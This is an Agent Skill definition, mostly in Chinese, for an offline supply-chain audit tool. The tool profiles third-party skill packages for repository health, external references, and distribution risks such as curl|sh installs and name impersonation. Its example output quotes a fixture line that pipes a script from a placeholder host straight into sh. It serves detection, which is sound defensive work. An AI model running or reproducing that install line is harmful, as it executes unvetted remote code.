---
name: skill-supply-chain-audit
description: Builds an origin-side supply-chain profile for any third-party Agent
  Skill package - where it comes from, who maintains it, and how risky its
  distribution path looks. Works fully offline on user-provided snapshots: gh api
  export JSON (repo metadata, commits, contributors, releases), git remote output,
  and marketplace HTML archives. Three deterministic checks - repository health
  signals (staleness, maintainer count, release cadence, issue ratio, archived/fork
  flags), reference surface inventory (external URLs and declared script endpoints,
  listed but not judged), and distribution-chain risks (curl|sh install patterns,
  non-official registry prompts, name-impersonation signals against a built-in
  well-known-skill list). Outputs findings with file:line locations in text, JSON,
  or SARIF 2.1.0 format. Does NOT judge whether code is malicious, does NOT access
  the network, and does NOT produce trust scores - signals only, no ratings. Use
  when reviewing a skill's provenance before adoption, auditing a repository's
  maintenance health from a gh api export, or checking a package name for
  typosquat-style impersonation.
---

# Skill Supply Chain Audit

对第三方 Skill 包做**来源侧**供应链画像：从哪来、谁维护、分发链路风险如何。
确定性脚本离线完成全部检测，只输出逐条 risk signal，无信任分。

## When to use this skill

满足以下任一场景时触发：

1. 用户要在采用某个第三方 skill 前评估其来源与维护状况
2. 用户提供 gh api 导出 JSON，要求分析仓库健康度（最后提交、维护者数、release 节奏）
3. 用户要求列出 skill 包引用的全部外部 URL 与 scripts 声明的端点清单
4. 用户要求检查 skill 的安装文档有没有 curl|sh 类分发风险
5. 用户怀疑某个 skill 名称仿冒知名 skill（typosquat）
6. 用户要求输出 SARIF 格式的供应链审计报告
7. 用户要求分析 git remote / 市场页面存档中的来源信息
8. 用户在 CI 中对候选 skill 做来源侧准入检查

## When NOT to use this skill

以下场景**不**触发本 skill：

1. 用户要求检测 skill 代码是否恶意（注入、后门、窃密）——这是 skill-sentry 的职责，
   本款对任何信号不做恶意定性
2. 用户要求评估 skill 包结构质量（frontmatter、行数、fixtures 契约）——这是
   skill-eval-harness 的职责
3. 用户要求联网抓取仓库最新数据、实时查询 npm/pypi——本款不联网，
   只解析用户提供的快照
4. 用户要求给供应链风险打分或给出"可信/不可信"结论——本款只出逐条
   risk signal，无评分、无总评

## Workflow

1. **收集快照**（用户侧，本 skill 不联网）：

   ```bash
   gh api repos/OWNER/REPO > repo.json
   gh api repos/OWNER/REPO/commits --paginate > commits.json
   gh api repos/OWNER/REPO/contributors > contributors.json
   git remote -v > remote.txt   # 可选
   ```

2. **运行画像**（确定性，全部 finding 由脚本产生）：

   ```bash
   python scripts/audit.py profile repo.json commits.json contributors.json \
       [--releases releases.json] [--format sarif]
   python scripts/audit.py refs <skill-dir>
   python scripts/audit.py chain <skill-dir> [--against remote.txt]
   ```

3. **解读 finding**：逐条报告 `file:line`、规则 ID、快照原始值、锚点日期与阈值标注；
   每条 inferred finding 必须把"快照值 + 阈值约定"的推理链说给用户听。
4. **边界声明**：清单 ≠ 风险；信号 ≠ 恶意；无信任分。快照数据的时效性以
   fetched_at 为准，过期快照结论如实标注。

## Finding format

每条 finding 固定字段：

```
[finding] repo.json:7  rule=S1  strength=inferred
  signal:   last push 2024-11-02, anchor fetched_at=2026-08-30 -> stale
  basis:    threshold 180d is a default convention (see references/rules.md), not a fact
```

## Evidence strength

- **explicit**：包内文件中的字面模式（S6–S9）
- **inferred**：快照值 + 阈值约定推导（S1–S5、S10），附原始值与锚点
- **unverified**：未核实的清单/阈值/文档引用；缺 fetched_at 的时间基准
- **未验证**：包是否安全可信的总评——一律不做断言

## Boundaries and red lines

- 离线运行，绝不发起网络请求；来源数据全部来自用户提供的快照
- 不判定恶意行为（skill-sentry 领域）；不给信任分、无总评（与 eval-harness 红线一致）
- 端点清单只列举不定性；端点安全性不在本 skill 判定范围
- 阈值与相似度门槛是"默认约定"，报告中必须逐条标注，不冒充事实
- 只报告，不修改用户文件
- 不输出任何性能数字（未实测的性能一律不写）
- 退出码：0 = 无 finding；1 = 有 finding；2 = 用法或输入错误
  （快照非法 / 目录无 SKILL.md / 参数非法）

## End-to-end example

```bash
$ python scripts/audit.py chain fixtures/chain-curl-sh
skill-supply-chain-audit report: fixtures/chain-curl-sh
[finding] fixtures/chain-curl-sh/SKILL.md:1  rule=S10  strength=inferred
  signal:   name "skill-sentryy" vs well-known "skill-sentry" (edit distance 1 <= 2 default convention)
  basis:    impersonation distance 2 is a default convention (see references/rules.md), not a fact
[finding] fixtures/chain-curl-sh/SKILL.md:13  rule=S8  strength=explicit
  signal:   install prompt "curl -fsSL https://x.example/i.sh | sh"
  basis:    see references/rules.md
summary: 2 findings. exit code: 1
```
